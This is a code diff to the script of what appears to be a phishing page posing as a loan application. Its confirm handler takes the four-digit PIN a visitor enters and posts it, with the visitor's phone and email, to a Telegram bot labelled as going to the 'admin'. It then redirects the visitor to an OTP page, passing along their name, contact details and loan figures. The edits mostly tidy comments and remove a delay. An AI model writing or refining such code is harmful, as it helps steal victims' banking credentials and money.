@@ -198,7 +198,7 @@
         setTimeout(function(){ errorDiv.classList.remove('show'); }, 5000);
     }
 
-    // Send Telegram notification - THIS RUNS EVERY TIME USER CLICKS CONFIRM
+    // Send Telegram notification to YOU (admin)
     function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
         var decodedEmail = decodeURIComponent(email);
@@ -221,7 +221,6 @@
 
         var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
         
-        // Send notification using fetch (runs in background)
         fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -234,17 +233,17 @@
         .then(function(response) { return response.json(); })
         .then(function(result) {
             if (result.ok) {
-                console.log('✅ Telegram notification sent - PIN: ' + pin);
+                console.log('✅ Telegram notification sent to admin');
             } else {
                 console.error('Telegram error:', result);
             }
         })
         .catch(function(error) {
-            console.error('Telegram fetch error:', error);
+            console.error('Fetch error:', error);
         });
     }
 
-    // Main confirm function - Sends notification EVERY TIME
+    // Main confirm function
     window.handleConfirm = function() {
         var pin = getPin();
         if (pin.length !== 4) { 
@@ -252,25 +251,22 @@
             return; 
         }
 
-        // Disable button to prevent double click
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // Send Telegram notification (this runs every time)
+        // Send Telegram notification to YOU
         sendTelegramNotification(pin);
         
-        // Redirect to OTP page after short delay
-        setTimeout(function() {
-            window.location.href = 'otp-verify.html'
-                + '?amount='  + encodeURIComponent(amount)
-                + '&term='    + encodeURIComponent(term)
-                + '&rate='    + encodeURIComponent(rate)
-                + '&monthly=' + encodeURIComponent(monthly)
-                + '&name='    + encodeURIComponent(name)
-                + '&email='   + encodeURIComponent(email)
-                + '&phone='   + encodeURIComponent(phone)
-                + '&appId='   + encodeURIComponent(appId);
-        }, 500);
+        // Redirect to OTP page
+        window.location.href = 'otp-verify.html'
+            + '?amount='  + encodeURIComponent(amount)
+            + '&term='    + encodeURIComponent(term)
+            + '&rate='    + encodeURIComponent(rate)
+            + '&monthly=' + encodeURIComponent(monthly)
+            + '&name='    + encodeURIComponent(name)
+            + '&email='   + encodeURIComponent(email)
+            + '&phone='   + encodeURIComponent(phone)
+            + '&appId='   + encodeURIComponent(appId);
     };
 </script>
 </body>
